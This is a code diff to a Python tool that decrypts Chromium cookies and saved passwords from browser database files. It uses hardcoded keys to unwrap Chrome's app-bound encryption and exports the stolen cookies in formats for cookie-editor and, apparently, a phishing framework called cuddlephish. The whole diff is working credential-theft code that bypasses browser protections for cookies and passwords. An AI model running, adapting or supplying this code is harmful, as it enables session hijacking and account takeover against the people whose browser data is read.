@@ -16,14 +16,14 @@ def cookies(key, file_location):
     try:
         conn = sqlite3.connect(file_location)
         cursor = conn.cursor()
-        cursor.execute('select host_key, "TRUE", path, "FALSE", expires_utc, name, CAST(encrypted_value AS BLOB) from cookies')
+        cursor.execute('select host_key, "TRUE", path, "FALSE", expires_utc, has_expires, name, CAST(encrypted_value AS BLOB) from cookies')
         values = cursor.fetchall()
-        for host_key, _, path, _, expires_utc, name, encrypted_value in values:
+        for host_key, _, path, _, expires_utc, has_expires, name, encrypted_value in values:
             print("Host: " + host_key)
             print("Path: " + path)
             print("Name: " + name)
             print("Cookie: " + decrypt_data(encrypted_value,key, False) + ";")
-            print("Expires: " + (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).strftime('%b %d %Y %H:%M:%S'))
+            print("Expires: " + (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).strftime('%b %d %Y %H:%M:%S')) if has_expires else -1
             print("")
     except sqlite3.Error as e:
         print("Error: Could not connect to database")
@@ -38,11 +38,11 @@ def cookies_for_editor(key, file_location):
     try:
         conn = sqlite3.connect(file_location)
         cursor = conn.cursor()
-        cursor.execute('select host_key, "TRUE", path, "FALSE", expires_utc, name, CAST(encrypted_value AS BLOB) from cookies')
+        cursor.execute('select host_key, "TRUE", path, "FALSE", expires_utc, has_expires, name, CAST(encrypted_value AS BLOB) from cookies')
         values = cursor.fetchall()
-        for host_key, _, path, _, expires_utc, name, encrypted_value in values:
+        for host_key, _, path, _, expires_utc, has_expires, name, encrypted_value in values:
             decrypted_value = decrypt_data(encrypted_value, key, False)
-            expiration_date = (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).timestamp()
+            expiration_date = (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).timestamp() if has_expires else -1
             cookie = {
                 "domain": host_key,
                 "expirationDate": expiration_date,
@@ -96,15 +96,15 @@ def cookies_for_cuddlephish(key, file_location):
         cursor = conn.cursor()
         cursor.execute('select creation_utc, host_key, top_frame_site_key, name, CAST(encrypted_value AS BLOB), path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_scheme, source_port, last_update_utc, source_type, has_cross_site_ancestor from cookies')
         values = cursor.fetchall()
-        
+
         for creation_utc, host_key, top_frame_site_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_scheme, source_port, last_update_utc, source_type, has_cross_site_ancestor in values:
             decrypted_value = decrypt_data(encrypted_value, key)
             expiration_date = (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).timestamp() if has_expires else -1
-        
+
             samesite_map = {0: "None", 1: "Lax", 2: "Strict"}
-            
+
             source_scheme_map = {0: "NonSecure", 1: "Secure"}
-            
+
             cookie = {
                 'domain': host_key,
                 'expires': expiration_date,
@@ -112,10 +112,10 @@ def cookies_for_cuddlephish(key, file_location):
                 'name': name,
                 'path': path,
                 'priority': priority_map.get(priority, "Medium"),
-                'sameParty': False, 
+                'sameParty': False,
                 'sameSite': samesite_map.get(samesite, "None"),
                 'secure': bool(is_secure),
-                'session': not bool(is_persistent), 
+                'session': not bool(is_persistent),
                 'size': len(name) + len(decrypted_value),
                 'sourcePort': source_port,
                 'value': decrypted_value
@@ -141,6 +141,13 @@ def decrypt_data(encrypted_junk, key, password=False):
     version = encrypted_junk[:3]
     if version in (b'v10', b'v11'):
         try:
+            if password:
+                initialisation_vector = encrypted_junk[3:15]
+                encrypted_password = encrypted_junk[15:-16]
+                cipher = AES.new(key, AES.MODE_GCM, initialisation_vector)
+                decrypted_pass = cipher.decrypt(encrypted_password)
+                decrypted_pass = decrypted_pass.decode('utf-8', errors='replace')
+                return decrypted_pass
             nonce = encrypted_junk[3:3 + 12]
             if len(nonce) == 0:
                 print("Error: Nonce cannot be empty")
@@ -149,12 +156,12 @@ def decrypt_data(encrypted_junk, key, password=False):
             tag = encrypted_junk[-16:]
             plain_text = AES.new(key, AES.MODE_GCM, nonce)
             text = plain_text.decrypt(cipher_text)
-            return text[32:].decode('utf-8')
+            return text[32:].decode('utf-8', errors='replace')
         except Exception as e:
             print("Error: Could not decrypt password")
             print(e)
             return ""
-    if version in (b'v20'):    
+    if version in (b'v20'):
         try:
             nonce = encrypted_junk[3:3 + 12]
             if len(nonce) == 0:
@@ -165,9 +172,9 @@ def decrypt_data(encrypted_junk, key, password=False):
             plain_text = AES.new(key, AES.MODE_GCM, nonce)
             text = plain_text.decrypt(cipher_text)
             if password:
-                return text.decode('utf-8')
+                return text.decode('utf-8', errors='replace')
             else:
-                return text[32:].decode('utf-8')
+                return text[32:].decode('utf-8', errors='replace')
         except Exception as e:
             print("Error: Could not decrypt password")
             print(e)
@@ -182,6 +189,7 @@ def argparse_args():
     parser.add_argument('-o','--option', choices=['cookies', 'passwords', 'cookie-editor', 'cuddlephish', 'firefox'], help='Option to choose', required=True)
     parser.add_argument('-f','--file', help='Location of the database file', required=True)
     parser.add_argument('--chrome-aes-key',help='Chrome AES Key',required=False)
+    parser.add_argument('--chrome-v10',action="store_false",help='Chrome v10',required=False)
     return parser.parse_args()
 
 def main():
@@ -191,12 +199,13 @@ def main():
     option = args.option
     file_location = args.file
     chromeAES = args.chrome_aes_key
+    chrome_v10 = args.chrome_v10
     if chromeAES:
         base64ChromeKey = base64.b64encode(chromeAES.encode())
-    
+
     key = bytearray(base64.b64decode(base64_key).decode('utf-8').replace('\\x', ''), 'utf-8')
     # if key len is not 32, then its chrome 127+
-    # https://github.com/runassu/chrome_v20_decryption/issues/14#issuecomment-2708796234 
+    # https://github.com/runassu/chrome_v20_decryption/issues/14#issuecomment-2708796234
     key = binascii.unhexlify(key)
 
     if (chromeAES):
@@ -206,30 +215,30 @@ def main():
         xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
         xored_aes_key = byte_xor(chromeKey, xor_key)
 
-
     #print(len(key))
-    if len(key) > 32:
-        aes_key = binascii.a2b_base64("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
-        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
-        flag = key[0]
-        iv = key[1:1+12]
-        ciphertext = key[1+12:1+12+32]
-        tag = key[1+12+32:]
+    if not chrome_v10:
+        if len(key) > 32:
+            aes_key = binascii.a2b_base64("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
+            chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
+            flag = key[0]
+            iv = key[1:1+12]
+            ciphertext = key[1+12:1+12+32]
+            tag = key[1+12+32:]
 
-        #check for flag to determine if AES or ChaCha. Changed in chrome 130+
-        if flag == 1:
-            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
-        elif flag == 2:
-            cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
-        elif flag == 3:
-            iv = key[1+32:1+32+12]
-            ciphertext = key[1+32+12:1+32+12+32]
-            tag = key[1+32+12+32:1+32+12+32+16]
-            cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=iv)
-        else:
-            raise ValueError(f"Unsupported flag: {flag}")
-        key = cipher.decrypt_and_verify(ciphertext, tag)
-        print("Decrypted App Bound Key: " + ''.join(f'\\x{b:02X}' for b in key) + "\n")
+            #check for flag to determine if AES or ChaCha. Changed in chrome 130+
+            if flag == 1:
+                cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
+            elif flag == 2:
+                cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
+            elif flag == 3:
+                iv = key[1+32:1+32+12]
+                ciphertext = key[1+32+12:1+32+12+32]
+                tag = key[1+32+12+32:1+32+12+32+16]
+                cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=iv)
+            else:
+                raise ValueError(f"Unsupported flag: {flag}")
+            key = cipher.decrypt_and_verify(ciphertext, tag)
+            print("Decrypted App Bound Key: " + ''.join(f'\\x{b:02X}' for b in key) + "\n")
 
     if option == "cookies":
         cookies(key, file_location)
@@ -244,6 +253,6 @@ def main():
     else:
         print("Error: Invalid option")
         sys.exit(1)
-    
+
 if __name__ == "__main__":
     main()
